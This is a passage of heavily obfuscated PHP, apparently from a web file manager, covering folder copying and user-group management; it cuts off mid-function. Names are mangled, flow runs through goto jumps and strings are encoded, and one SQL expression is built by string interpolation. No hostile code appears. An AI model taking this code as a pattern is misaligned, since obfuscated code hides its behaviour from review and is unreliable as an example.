$F¿íÛñÖ = array($Bñ³¥Ê¨¹Ö[441] => array($Bñ³¥Ê¨¹Ö[7], $A¯µÑàçÎÔ)); goto a„ô‡£‡º°; bİ†î¿©ç˜: $Bñ³¥Ê¨¹Ö =& $_SERVER[ã®Â„Éæ¹¤]; $f÷Ş‚ïÇåÚ = $this->sourceInfo($béœÖ –); $Añ¢¸Áãê = $this->sourceInfo($F¼îÏ²×Ä); goto D‡¨ì¾ªÊ«; a„ô‡£‡º°: Model($Bñ³¥Ê¨¹Ö[537])->where($F¿íÛñÖ)->save(array($Bñ³¥Ê¨¹Ö[448] => 0)); Model($Bñ³¥Ê¨¹Ö[538])->where($F¿íÛñÖ)->delete(); goto aÔ§›”±À; aÔ§›”±À: } public function copyFolderFromIO($b©òä¬Ë, $e‹Ê¸ç£„³, $cù’šÁ¢÷ê, $cñÃ¥á ¡, $a¥®îä˜ç, $Eè–³ÑÏóÃ = false) { goto aÌÖË÷Å–; c’ÃáÚßÃÖ: $EáÎäÃò½º = $this->fileNameExist($cù’šÁ¢÷ê, $CÛßœò¼¹·); $EÉ‡Ç—ê  = $this->mkdir($cù’šÁ¢÷ê, $CÛßœò¼¹·, $cñÃ¥á ¡); if (!$EáÎäÃò½º || $cñÃ¥á ¡ == REPEAT_RENAME_FOLDER) { $cñÃ¥á ¡ = !1; } goto fÊ†õÙ•Ú; aåÎÂ•¢¬: $this->updateModifyTime($cù’šÁ¢÷ê); return $EÉ‡Ç—ê ; goto d Ñ· ’ïö; fÊ†õÙ•Ú: if ($EáÎäÃò½º) { $this->_childrenAllMake($EáÎäÃò½º); } Hook::trigger($CÛÓ¤ˆ÷ã«[540]); $this->_copyChildTo($b©òä¬Ë, $e‹Ê¸ç£„³, $EÉ‡Ç—ê , $cñÃ¥á ¡, $aÊàÙõíŒ, $a¥®îä˜ç); goto c®ö«ù…²­; aÌÖË÷Å–: $CÛÓ¤ˆ÷ã« =& $_SERVER[ã®Â„Éæ¹¤]; $aÊàÙõíŒ = array($CÛÓ¤ˆ÷ã«[504] => array(), $CÛÓ¤ˆ÷ã«[505] => array(), $CÛÓ¤ˆ÷ã«[503] => array(), $CÛÓ¤ˆ÷ã«[539] => array()); $CÛßœò¼¹· = $Eè–³ÑÏóÃ ? $Eè–³ÑÏóÃ : $b©òä¬Ë->getPathName($b©òä¬Ë->pathThis($e‹Ê¸ç£„³)); goto c’ÃáÚßÃÖ; c®ö«ù…²­: Hook::trigger($CÛÓ¤ˆ÷ã«[541]); if ($EÉ‡Ç—ê ) { $this->folderSizeResetChildren($EÉ‡Ç—ê ); } $this->_childrenListClear(); goto bÌ´Ğ‰˜ò; CÃ‚½‡ÙÆÄ: Model($CÛÓ¤ˆ÷ã«[422])->linkAdd($aÊàÙõíŒ[$CÛÓ¤ˆ÷ã«[503]]); Model($CÛÓ¤ˆ÷ã«[422])->remove($aÊàÙõíŒ[$CÛÓ¤ˆ÷ã«[539]]); $this->folderSizeReset($cù’šÁ¢÷ê); goto aåÎÂ•¢¬; bÌ´Ğ‰˜ò: Model($CÛÓ¤ˆ÷ã«[506])->addAll($aÊàÙõíŒ[$CÛÓ¤ˆ÷ã«[504]], array(), !0); Model($CÛÓ¤ˆ÷ã«[507])->eventCopy($EÉ‡Ç—ê ); $this->saveAll($aÊàÙõíŒ[$CÛÓ¤ˆ÷ã«[505]]); goto CÃ‚½‡ÙÆÄ; d Ñ· ’ïö: } private function _copyChildTo($aÀª†‡‡ÆÒ, $dË¿¹·îØ, $E•‡¿˜ÍåŒ, $a„´®‘Ÿ÷Ç, &$a˜«Ø¥äöµ, $fæ…ÙØÛƒ•) { goto c´ò„Šª¢õ; Eò—‘ÛÄ‹é: foreach ($F®†òÁ‰­é as &$eå¤ªšÕ¼) { goto Dí‚‘²ô; fÖĞù“Úğá: $eå¤ªšÕ¼[$dÂÜñ“¼[77]] = _get($eå¤ªšÕ¼, $dÂÜñ“¼[77], 0); $eå¤ªšÕ¼[$dÂÜñ“¼[419]] = _get($eå¤ªšÕ¼, $dÂÜñ“¼[419], 0); if (!isset($eå¤ªšÕ¼[$dÂÜñ“¼[542]]) && $eå¤ªšÕ¼[$dÂÜñ“¼[419]]) { $a˜«Ø¥äöµ[$dÂÜñ“¼[539]][] = $eå¤ªšÕ¼[$dÂÜñ“¼[419]]; } goto C†ŒÄ˜” ; C†ŒÄ˜” : if ($a„´®‘Ÿ÷Ç) { $AÁĞªˆˆé¾ = $this->fileNameExistCache($E•‡¿˜ÍåŒ, $eå¤ªšÕ¼[$dÂÜñ“¼[28]]); if ($AÁĞªˆˆé¾) { if ($eå¤ªšÕ¼[$dÂÜñ“¼[370]] || $a„´®‘Ÿ÷Ç == REPEAT_SKIP) { continue; } if ($a„´®‘Ÿ÷Ç == REPEAT_REPLACE) { $bÛÅ­ëÈÈ– = $this->sourceInfoCache($AÁĞªˆˆé¾); $Cê«Æ³ó‹ = $this->fileHistory($bÛÅ­ëÈÈ–, $eå¤ªšÕ¼[$dÂÜñ“¼[419]], $eå¤ªšÕ¼[$dÂÜñ“¼[77]]); if ($Cê«Æ³ó‹) { $a˜«Ø¥äöµ[$dÂÜñ“¼[503]][] = $eå¤ªšÕ¼[$dÂÜñ“¼[419]]; } continue; } else { if ($a„´®‘Ÿ÷Ç == REPEAT_RENAME) { $eå¤ªšÕ¼[$dÂÜñ“¼[28]] = $this->fileNameAutoCache($E•‡¿˜ÍåŒ, $eå¤ªšÕ¼[$dÂÜñ“¼[28]], $a„´®‘Ÿ÷Ç, !1); } } } } if (!$eå¤ªšÕ¼[$dÂÜñ“¼[370]] && $eå¤ªšÕ¼[$dÂÜñ“¼[419]]) { $a˜«Ø¥äöµ[$dÂÜñ“¼[503]][] = $eå¤ªšÕ¼[$dÂÜñ“¼[419]]; } $Cà¤‘ëÉ‰á[] = $this->_makeItemData($eå¤ªšÕ¼, $d‹°° Ç, $eå¤ªšÕ¼[$dÂÜñ“¼[28]]); goto c‡Îˆë•¹º; Dí‚‘²ô: if (isset($C”«Ó‹¿Û”[$eå¤ªšÕ¼[$dÂÜñ“¼[28]]])) { $eå¤ªšÕ¼ = $C”«Ó‹¿Û”[$eå¤ªšÕ¼[$dÂÜñ“¼[28]]]; } $eå¤ªšÕ¼[$dÂÜñ“¼[370]] = $eå¤ªšÕ¼[$dÂÜñ“¼[29]] == $dÂÜñ“¼[76]; $eå¤ªšÕ¼[$dÂÜñ“¼[372]] = _get($eå¤ªšÕ¼, $dÂÜñ“¼[160], $dÂÜñ“¼[33]); goto fÖĞù“Úğá; c‡Îˆë•¹º: } unset($eå¤ªšÕ¼); if (!empty($Cà¤‘ëÉ‰á)) { $this->addAll($Cà¤‘ëÉ‰á); } goto b°Ø·Ç¼¡º; f…Ú‡ğŸ²ø: $F®†òÁ‰­é = array_merge($C™é„øãˆĞ[$dÂÜñ“¼[73]], $C™é„øãˆĞ[$dÂÜñ“¼[74]]); $C”«Ó‹¿Û” = $this->_addFiles($aÀª†‡‡ÆÒ, $C™é„øãˆĞ[$dÂÜñ“¼[73]], $fæ…ÙØÛƒ•); $Cà¤‘ëÉ‰á = array(); goto Eò—‘ÛÄ‹é; c´ò„Šª¢õ: $dÂÜñ“¼ =& $_SERVER[ã®Â„Éæ¹¤]; $d‹°° Ç = $this->sourceInfoCache($E•‡¿˜ÍåŒ); $C™é„øãˆĞ = $aÀª†‡‡ÆÒ->listPath($dË¿¹·îØ, !1, !0); goto f…Ú‡ğŸ²ø; b°Ø·Ç¼¡º: $E§ìÂ¾ê½ = $this->_childrenList($E•‡¿˜ÍåŒ); $E§ìÂ¾ê½ = array_to_keyvalue($E§ìÂ¾ê½, $dÂÜñ“¼[28]); foreach ($F®†òÁ‰­é as $eå¤ªšÕ¼) { $bÛÅ­ëÈÈ– = $E§ìÂ¾ê½[$eå¤ªšÕ¼[$dÂÜñ“¼[28]]]; $aÕÒÓéŸ‚Å = $bÛÅ­ëÈÈ–[$dÂÜñ“¼[369]]; $this->_copyApplyMeta($bÛÅ­ëÈÈ–, $a˜«Ø¥äöµ); if ($eå¤ªšÕ¼[$dÂÜñ“¼[29]] == $dÂÜñ“¼[76]) { $eå¤ªšÕ¼[$dÂÜñ“¼[75]] = $aÀª†‡‡ÆÒ->getPathInner($eå¤ªšÕ¼[$dÂÜñ“¼[75]]); $this->_copyChildTo($aÀª†‡‡ÆÒ, $eå¤ªšÕ¼[$dÂÜñ“¼[75]], $aÕÒÓéŸ‚Å, $a„´®‘Ÿ÷Ç, $a˜«Ø¥äöµ, $fæ…ÙØÛƒ•); } } goto B‚¯áˆ‡óÌ; B‚¯áˆ‡óÌ: } private function _addFiles($CƒÀòˆÛÚÁ, $fÖàÒØ¹Ü¥, $EŸ°ˆ´â) { goto döà¡¥Íğä; FøÖŠÅóŒÀ: foreach ($dÒ¦Õ‹™ß as $B‚ôøçÁ±É) { if (!isset($aªáÉ¥Ó‚Ì[$B‚ôøçÁ±É[$dñç™Áßõ°[163]]])) { continue; } $d¨Š´ø”©ˆ = $aªáÉ¥Ó‚Ì[$B‚ôøçÁ±É[$dñç™Áßõ°[163]]]; foreach ($d¨Š´ø”©ˆ as &$fİÚİ¥‰‰) { $fİÚİ¥‰‰[$dñç™Áßõ°[419]] = $B‚ôøçÁ±É[$dñç™Áßõ°[419]]; $fİÚİ¥‰‰[$dñç™Áßõ°[542]] = !0; } unset($fİÚİ¥‰‰); } $f‘¸¸ó™† = array(); foreach ($fÖàÒØ¹Ü¥ as $B±‚Ûô”é­) { if (isset($B±‚Ûô”é­[$dñç™Áßõ°[542]]) && $B±‚Ûô”é­[$dñç™Áßõ°[542]]) { continue; } $f¿³â™øä = $CƒÀòˆÛÚÁ->getPathInner($B±‚Ûô”é­[$dñç™Áßõ°[75]]); $B†ÕÀå§›‘ = $a¢‰…¾§é†->addFileMake($f¿³â™øä, $B±‚Ûô”é­[$dñç™Áßõ°[77]], $B±‚Ûô”é­[$dñç™Áßõ°[164]], $B±‚Ûô”é­[$dñç™Áßõ°[163]], $B±‚Ûô”é­[$dñç™Áßõ°[28]], $EŸ°ˆ´â); $f‘¸¸ó™†[] = $B†ÕÀå§›‘; } goto bôöˆ÷¡Ûã; C²´ˆªƒë: $dÒ¦Õ‹™ß = $dÒ¦Õ‹™ß ? $dÒ¦Õ‹™ß : array(); foreach ($dÒ¦Õ‹™ß as $B‚ôøçÁ±É) { if (!isset($aªáÉ¥Ó‚Ì[$B‚ôøçÁ±É[$dñç™Áßõ°[163]]])) { continue; } $E‡‘—Úù“õ =& $aªáÉ¥Ó‚Ì[$B‚ôøçÁ±É[$dñç™Áßõ°[163]]]; foreach ($E‡‘—Úù“õ as &$fİÚİ¥‰‰) { $fİÚİ¥‰‰[$dñç™Áßõ°[419]] = $B‚ôøçÁ±É[$dñç™Áßõ°[419]]; } unset($fİÚİ¥‰‰); } $Dé¡ ßå±± = array(); goto dÚ¢¸¾¥²‚; cÇÓ¡Á”ˆ: foreach ($fÖàÒØ¹Ü¥ as &$fİÚİ¥‰‰) { goto cÙß¥ÁôÜ¹; c©Ë·Õ…Èñ: $DÆ×ª¸…¹ó = $CƒÀòˆÛÚÁ->hashMd5($fİÚİ¥‰‰[$dñç™Áßõ°[75]]); if (strlen($DÆ×ª¸…¹ó) > 10 && !isset($aªáÉ¥Ó‚Ì[$DÆ×ª¸…¹ó])) { $aªáÉ¥Ó‚Ì[$DÆ×ª¸…¹ó] = array(); } $fİÚİ¥‰‰[$dñç™Áßõ°[164]] = $a«†ù‰êµõ; goto DË×ë˜ªÅ×; d±±ÎÚ‡ÂÒ: if (count($aªáÉ¥Ó‚Ì[$DÆ×ª¸…¹ó]) > 1) { $fİÚİ¥‰‰[$dñç™Áßõ°[542]] = !0; } goto E·®™¸ÌÜÀ; DË×ë˜ªÅ×: $fİÚİ¥‰‰[$dñç™Áßõ°[163]] = $DÆ×ª¸…¹ó; Hook::trigger($dñç™Áßõ°[544], $fİÚİ¥‰‰); $aªáÉ¥Ó‚Ì[$DÆ×ª¸…¹ó][] =& $fİÚİ¥‰‰; goto d±±ÎÚ‡ÂÒ; cÙß¥ÁôÜ¹: Hook::trigger($dñç™Áßõ°[543], $fİÚİ¥‰‰); $fİÚİ¥‰‰[$dñç™Áßõ°[75]] = $CƒÀòˆÛÚÁ->getPathInner($fİÚİ¥‰‰[$dñç™Áßõ°[75]]); $a«†ù‰êµõ = $CƒÀòˆÛÚÁ->hashSimple($fİÚİ¥‰‰[$dñç™Áßõ°[75]]); goto c©Ë·Õ…Èñ; E·®™¸ÌÜÀ: } unset($fİÚİ¥‰‰); $dÇ¦ŠŠÏ˜ = array($dñç™Áßõ°[163] => array($dñç™Áßõ°[7], array_keys($aªáÉ¥Ó‚Ì))); goto CÎ¢ã®æÉà; döà¡¥Íğä: $dñç™Áßõ° =& $_SERVER[ã®Â„Éæ¹¤]; if (!$fÖàÒØ¹Ü¥ || count($fÖàÒØ¹Ü¥) == 0) { return array(); } $aªáÉ¥Ó‚Ì = array(); goto cÇÓ¡Á”ˆ; CÎ¢ã®æÉà: $a¢‰…¾§é† = Model($dñç™Áßõ°[545]); $dÒ¦Õ‹™ß = $a¢‰…¾§é†->where($dÇ¦ŠŠÏ˜)->select(); $dÒ¦Õ‹™ß = $dÒ¦Õ‹™ß ? $dÒ¦Õ‹™ß : array(); goto FøÖŠÅóŒÀ; bôöˆ÷¡Ûã: $a¢‰…¾§é†->addAll($f‘¸¸ó™†); $dÇ¦ŠŠÏ˜ = array($dñç™Áßõ°[163] => array($dñç™Áßõ°[7], array_keys($aªáÉ¥Ó‚Ì))); $dÒ¦Õ‹™ß = $a¢‰…¾§é†->where($dÇ¦ŠŠÏ˜)->select(); goto C²´ˆªƒë; dÚ¢¸¾¥²‚: foreach ($fÖàÒØ¹Ü¥ as $AÌ¶”ÀÁ¨) { $Dé¡ ßå±±[$AÌ¶”ÀÁ¨[$dñç™Áßõ°[28]]] = $AÌ¶”ÀÁ¨; } return $Dé¡ ßå±±; goto EÜÖƒæ¾İ; EÜÖƒæ¾İ: } } define($_SERVER[ã®Â„Éæ¹¤][546], $_SERVER[ã®Â„Éæ¹¤][547]); goto dŒÃ•÷¥—Õ; D¼¨¹êØËæ: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\x6d\145" => "\147\x72\157\165\x70\137\155\x65\164\x61", "\155\145\x74\141\106\151\145\x6c\144" => "\147\x72\x6f\x75\160\111\x44"); protected function cacheFunctionAlias($Bçâï«È) { $Cñ»«æİ‰ =& $_SERVER[ã®Â„Éæ¹¤]; return array($Cñ»«æİ‰[2196] => array($Bçâï«È[0], $Cñ»«æİ‰[2197]), $Cñ»«æİ‰[2198] => array($Bçâï«È[0], $Cñ»«æİ‰[2197])); } protected function getInfo($cãé†Ó²‘Î) { $Bµß¢¡Š‘ = $this->getInfoSimple($cãé†Ó²‘Î); if (!$Bµß¢¡Š‘) { return !1; } return $this->_listDataApplyItem($Bµß¢¡Š‘); } protected function getInfoSimple($dè±Œ¼”¤, $cèÔ™Â»ÃÜ = false) { $c‘†»ÈºÔ¬ =& $_SERVER[ã®Â„Éæ¹¤]; if ($cèÔ™Â»ÃÜ) { $cÊÈª“ø¾Ä = array($c‘†»ÈºÔ¬[2127] => intval($dè±Œ¼”¤)); $FÓˆ’›éó = $this->where($cÊÈª“ø¾Ä)->find(); return is_array($FÓˆ’›éó) ? $FÓˆ’›éó : array(); } return $this->cacheFunctionGet($c‘†»ÈºÔ¬[2199], $dè±Œ¼”¤); } protected function groupAdd($Dƒˆ´Ÿ•÷) { goto CæºÕº¨“; CæºÕº¨“: $aàë¸“ñ” =& $_SERVER[ã®Â„Éæ¹¤]; if (!$Dƒˆ´Ÿ•÷[$aàë¸“ñ”[463]] && isset($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2127]]) && $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2127]] == 1) { if ($e‹ã±¾ëæª = $this->getInfoSimple($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2127]], !0)) { return $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2127]]; } } else { $e‹ã±¾ëæª = $this->getInfoSimple($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[463]]); if (!$e‹ã±¾ëæª) { return !1; } } $D¶°µİÃ´à = $aàë¸“ñ”[472]; goto AÍ¯¹ÙœÁ‰; Eœšò†äÁ¹: if (isset($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2202]])) { $this->metaSet($bÆåíÛÙØ, array($aàë¸“ñ”[2202] => $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2202]], $aàë¸“ñ”[2203] => $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2203]])); unset($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2202]]); unset($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2203]]); } Model($aàë¸“ñ”[1136])->groupRootAdd($bÆåíÛÙØ); return $bÆåíÛÙØ; goto BÆÅ¶Çá‘ğ; AÍ¯¹ÙœÁ‰: if ($e‹ã±¾ëæª[$aàë¸“ñ”[461]]) { $D¶°µİÃ´à = $e‹ã±¾ëæª[$aàë¸“ñ”[461]] . $e‹ã±¾ëæª[$aàë¸“ñ”[2127]] . $aàë¸“ñ”[47]; } $DñÒ¾ˆ®è = array($aàë¸“ñ”[386] => $this->groupNameAuto($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[463]], $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[28]]), $aàë¸“ñ”[368] => $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[463]], $aàë¸“ñ”[527] => $D¶°µİÃ´à, $aàë¸“ñ”[2200] => $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2111]], $aàë¸“ñ”[2201] => 0, $aàë¸“ñ”[2131] => 0); if (isset($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2149]])) { $DñÒ¾ˆ®è[$aàë¸“ñ”[2149]] = $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2149]]; } else { $a›„Ã¡» = $this->max($aàë¸“ñ”[2149]); if (!$a›„Ã¡») { $a›„Ã¡» = 0; } $DñÒ¾ˆ®è[$aàë¸“ñ”[2149]] = $a›„Ã¡» + 1; } goto Dºˆ¬­ÜÃó; Dºˆ¬­ÜÃó: if (!empty($Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2127]])) { $DñÒ¾ˆ®è[$aàë¸“ñ”[2127]] = $Dƒˆ´Ÿ•÷[$aàë¸“ñ”[2127]]; } $bÆåíÛÙØ = $this->add($DñÒ¾ˆ®è); $this->setNamePinyin($bÆåíÛÙØ, $DñÒ¾ˆ®è[$aàë¸“ñ”[28]]); goto Eœšò†äÁ¹; BÆÅ¶Çá‘ğ: } protected function groupEdit($b‰¡åƒÚ‹è, $A§¦Êœ›¯­) { $aÇñ¶’ =& $_SERVER[ã®Â„Éæ¹¤]; if (!empty($A§¦Êœ›¯­[$aÇñ¶’[463]])) { $A·î—Ë  = $this->getInfoSimple($b‰¡åƒÚ‹è); $A—Å†Û¾Ê“ = $this->getInfoSimple($A§¦Êœ›¯­[$aÇñ¶’[463]]); if (!$A·î—Ë  || !$A—Å†Û¾Ê“) { return !1; } if ($A·î—Ë [$aÇñ¶’[2127]] == $A—Å†Û¾Ê“[$aÇñ¶’[2127]]) { return !1; } if ($A§¦Êœ›¯­[$aÇñ¶’[463]] != $A·î—Ë [$aÇñ¶’[463]]) { if ($A—Å†Û¾Ê“[$aÇñ¶’[461]] !== $A·î—Ë [$aÇñ¶’[461]] && strpos($A—Å†Û¾Ê“[$aÇñ¶’[461]], $A·î—Ë [$aÇñ¶’[461]] . $A·î—Ë [$aÇñ¶’[2127]] . $aÇñ¶’[47]) === 0) { return !1; } $A§¦Êœ›¯­[$aÇñ¶’[527]] = $A—Å†Û¾Ê“[$aÇñ¶’[461]] . $A§¦Êœ›¯­[$aÇñ¶’[463]] . $aÇñ¶’[47]; $this->_changeChildLevel($A·î—Ë , $A—Å†Û¾Ê“); } } if (isset($A§¦Êœ›¯­[$aÇñ¶’[28]])) { $this->setNamePinyin($b‰¡åƒÚ‹è, $A§¦Êœ›¯­[$aÇñ¶’[28]]); } if (isset($A§¦Êœ›¯­[$aÇñ¶’[2202]])) { $this->metaSet($b‰¡åƒÚ‹è, array($aÇñ¶’[2202] => $A§¦Êœ›¯­[$aÇñ¶’[2202]], $aÇñ¶’[2203] => $A§¦Êœ›¯­[$aÇñ¶’[2203]])); unset($A§¦Êœ›¯­[$aÇñ¶’[2202]]); unset($A§¦Êœ›¯­[$aÇñ¶’[2203]]); } return $this->where(array($aÇñ¶’[2204] => $b‰¡åƒÚ‹è))->save($A§¦Êœ›¯­); } private function _changeChildLevel($c« ‹îã¬, $d“ï™†ì’ˆ, $AíŸàé¹†ì = false) { goto dàë†Å”½Í; d…•£à‰ÖÆ: if ($AíŸàé¹†ì) { $dƒöøõ¸ç = $d“ï™†ì’ˆ[$aË÷¼½¿Î[461]] . $d“ï™†ì’ˆ[$aË÷¼½¿Î[2127]] . $aË÷¼½¿Î[47]; } $BÂÅˆÇ½‚· = array($aË÷¼½¿Î[527] => array($aË÷¼½¿Î[485], $c« ‹îã¬[$aË÷¼½¿Î[461]] . $c« ‹îã¬[$aË÷¼½¿Î[2127]] . $aË÷¼½¿Î[486])); $b’£„İ‹Èã = array($aË÷¼½¿Î[527] => array($aË÷¼½¿Î[535], "\162\145\160\x6c\x61\143\145\50\160\x61\x72\x65\x6e\164\x4c\x65\166\145\154\x2c\x27{$f†Œ«˜ÑÁŸ}\x27\x2c\47{$dƒöøõ¸ç}\x27\51")); goto f‡¤İ˜…ó; dàë†Å”½Í: $aË÷¼½¿Î =& $_SERVER[ã®Â„Éæ¹¤]; $f†Œ«˜ÑÁŸ = $c« ‹îã¬[$aË÷¼½¿Î[461]] . $c« ‹îã¬[$aË÷¼½¿Î[2127]] . $aË÷¼½¿Î[47]; $dƒöøõ¸ç = $d“ï™†ì’ˆ[$aË÷¼½¿Î[461]] . $d“ï™†ì’ˆ[$aË÷¼½¿Î[2127]] . $aË÷¼½¿Î[47] . $c« ‹îã¬[$aË÷¼½¿Î[2127]] . $aË÷¼½¿Î[47]; goto d…•£à‰ÖÆ; f‡¤İ˜…ó: $this->where($BÂÅˆÇ½‚·)->data($b’£„İ‹Èã)->save(); goto A»¬İ‰÷Ó»; A»¬İ‰÷Ó»: } public function setNamePinyin($e«ç´¥œ¾ó, $A¢‚º›‹« = false) { $Cğ­éñÖ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$A¢‚º›‹«) { $fù£™œåÂñ = $this->getInfoSimple($e«ç´¥œ¾ó); $A¢‚º›‹« = $fù£™œåÂñ[$Cğ­éñÖ[28]]; } if (!Input::check($A¢‚º›‹«, $Cğ­éñÖ[530])) { $this->metaSet($e«ç´¥œ¾ó, $Cğ­éñÖ[416], null); $this->metaSet($e«ç´¥œ¾ó, $Cğ­éñÖ[415], null); return; } $Còâš£åÖï = array($Cğ­éñÖ[416] => str_replace($Cğ­éñÖ[50], $Cğ­éñÖ[33], Pinyin::encode($A¢‚º›‹«)), $Cğ­éñÖ[415] => Pinyin::encode($A¢‚º›‹«, $Cğ­éñÖ[531])); $this->metaSet($e«ç´¥œ¾ó, $Còâš£åÖï); } protected function groupStatus($b¿ÀÕ¼¾Õõ, $Eê²ô«´Ş®) { goto C…¼°ùãç…; d„ÍÚó“¯†: foreach ($fçïºæíìš as $b¿ÀÕ¼¾Õõ) { $B¤ßÑÑ’Ş¶[] = array($e¡òÁ«²åà[2127] => $b¿ÀÕ¼¾Õõ, $e¡òÁ«²åà[89] => $e¡òÁ«²åà[711], $e¡òÁ«²åà[359] => $Eê²ô«´Ş®); } return Model($e¡òÁ«²åà[2205])->addAll($B¤ßÑÑ’Ş¶, array(), !0); goto D¬•“´òÓ¦; D¨ëˆ¡Â°æ: if ($Eê²ô«´Ş® == $e¡òÁ«²åà[83]) { $fçïºæíìš = $this->parentLevelArray($c…ˆ‹ãÖ[$e¡òÁ«²åà[461]]); } else { $A§ªäÂ‘¬ = array($e¡òÁ«²åà[527] => array($e¡òÁ«²åà[485], $c…ˆ‹ãÖ[$e¡òÁ«²åà[461]] . $c…ˆ‹ãÖ[$e¡òÁ«²åà[2127]] . $e¡òÁ«²åà[486])); $fçïºæíìš = $this->where($A§ªäÂ‘¬)->field($e¡òÁ«²åà[2127])->select(); $fçïºæíìš = array_to_keyvalue($fçïºæíìš, $e¡òÁ«²åà[33], $e¡òÁ«²åà[2127]); } $fçïºæíìš[] = $c…ˆ‹ãÖ[$e¡òÁ«²åà[2127]]; $B¤ßÑÑ’Ş¶ = array(); goto d„ÍÚó“¯†; C…¼°ùãç…: $e¡òÁ«²åà =& $_SERVER[ã®Â„Éæ¹¤]; $c…ˆ‹ãÖ = $this->getInfoSimple($b¿ÀÕ¼¾Õõ); if (!$c…ˆ‹ãÖ) { return !1; } goto D¨ëˆ¡Â°æ; D¬•“´òÓ¦: } protected function groupRemove($døÚ½ÑÆ‡„) { goto E’µé™óŠ®; EƒêÜ»‘ïÙ: if (!$a¦¦Ó±¬ğ† || $a¦¦Ó±¬ğ†[$C«¦ÇÏáİ[463]] == 0) { return !1; } $e‹ÇÅ’Öá = $this->getInfoSimple($a¦¦Ó±¬ğ†[$C«¦ÇÏáİ[463]]); $this->_changeChildLevel($a¦¦Ó±¬ğ†, $e‹ÇÅ’Öá, !0); goto båÁÓ¯ƒøğ; E’µé™óŠ®: $C«¦ÇÏáİ =& $_SERVER[ã®Â„Éæ¹¤]; $b‡Áµ–š”Š = array($C«¦ÇÏáİ[2127] => $døÚ½ÑÆ‡„); $a¦¦Ó±¬ğ† = $this->where($b‡Áµ–š”Š)->find(); goto EƒêÜ»‘ïÙ; båÁÓ¯ƒøğ: $this->where(array($C«¦ÇÏáİ[463] => $døÚ½ÑÆ‡„))->save(array($C«¦ÇÏáİ[463] => $a¦¦Ó±¬ğ†[$C«¦ÇÏáİ[463]])); Model($C«¦ÇÏáİ[2205])->where($b‡Áµ–š”Š)->delete(); Model($C«¦ÇÏáİ[2206])->where($b‡Áµ–š”Š)->delete(); goto aˆå‹…³¾¼; aˆå‹…³¾¼: Model($C«¦ÇÏáİ[775])->groupRootRemove($døÚ½ÑÆ‡„); return $this->where($b‡Áµ–š”Š)->delete(); goto CÚù«ï·ÓË; CÚù«ï·ÓË: } protected function groupSort($b­ÄÙ±†§ª) { $Cåõ˜æ­ó =& $_SERVER[ã®Â„Éæ¹¤]; $D™Òàœœ = array(); foreach ($b­ÄÙ±†§ª as $Eˆ«¸œ®®™ => $E¼˜éÆ÷¤é) { $D™Òàœœ[] = array($Cåõ˜æ­ó[2127], $E¼˜éÆ÷¤é, $Cåõ˜æ­ó[2149], $Eˆ«¸œ®®™ + 1); } $this->saveAll($D™Òàœœ); } public function listData() { $Cù ëŠ¬ÕÎ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Cù ëŠ¬ÕÎ[$_SERVER[ã®Â„Éæ¹¤][354]]); return $Cù ëŠ¬ÕÎ; } private function _makeOrder($A×£Ù§ = '') { goto EÀ”†Š¦ãÕ; EÀ”†Š¦ãÕ: $dç„‚ìâ£ù =& $_SERVER[ã®Â„Éæ¹¤]; $EÄİ³¼“ğª = array($dç„‚ìâ£ù[2127], $dç„‚ìâ£ù[28], $dç„‚ìâ£ù[2113], $dç„‚ìâ£ù[187]); $c‡éó¿öÊ = array($dç„‚ìâ£ù[402] => $dç„‚ìâ£ù[403], $dç„‚ìâ£ù[404] => $dç„‚ìâ£ù[405]); goto Cì…¯Û©Ô; DäêêÔÈ§­: $A×£Ù§ = $A×£Ù§ . "{$F¢„Ÿº¤‹}\x20{$F“‹½‹¦œİ}\54\x20\147\162\157\165\x70\x49\104\40\141\x73\143"; return $this->order($A×£Ù§); goto bÛìØÓëãã; Cì…¯Û©Ô: $F¢„Ÿº¤‹ = Input::get($dç„‚ìâ£ù[407], $dç„‚ìâ£ù[7], $dç„‚ìâ£ù[2131], $EÄİ³¼“ğª); $F“‹½‹¦œİ = Input::get($dç„‚ìâ£ù[408], $dç„‚ìâ£ù[7], $dç„‚ìâ£ù[2207], array($dç„‚ìâ£ù[2207], $dç„‚ìâ£ù[404])); $F“‹½‹¦œİ = $c‡éó¿öÊ[$F“‹½‹¦œİ]; goto DäêêÔÈ§­; bÛìØÓëãã: } public function listChild($AØ¡Ç…ÙÒÁ) { $böŞí‰Ş× =& $_SERVER[ã®Â„Éæ¹¤]; $d“°²‡ğß = $this->where(array($böŞí‰Ş×[463] => $AØ¡Ç…ÙÒÁ))->_makeOrder()->selectPage(200); $this->_listDataApply($d“°²‡ğß[$böŞí‰Ş×[354]]); return $d“°²‡ğß; } public function listByID($E³˜¦¥ù­î) { $E’…ìÒ¸Í® =& $_SERVER[ã®Â„Éæ¹¤]; if (!$E³˜¦¥ù­î) { return array(); } $eÄ”Š³ùšø = array($E’…ìÒ¸Í®[2127] => array($E’…ìÒ¸Í®[7], $E³˜¦¥ù­î)); $b¶‚æÎÙŸ = $this->where($eÄ”Š³ùšø)->select(); $this->_listDataApply($b¶‚æÎÙŸ); return $b¶‚æÎÙŸ; } public function listSearch($câĞÃ×éÓ) { goto FİÌ«êš§Û; A«½è£ã‘´: if ($D½·ø²»ã) { $Bó“ôóíó÷ = $this->getInfoSimple($D½·ø²»ã); $Fëò¸à©« = $Bó“ôóíó÷[$eÅ‘ôôŒªˆ[461]] . $D½·ø²»ã . $eÅ‘ôôŒªˆ[486]; $C˜‚Ö¸«‡à = array($C˜‚Ö¸«‡à, array($eÅ‘ôôŒªˆ[461] => 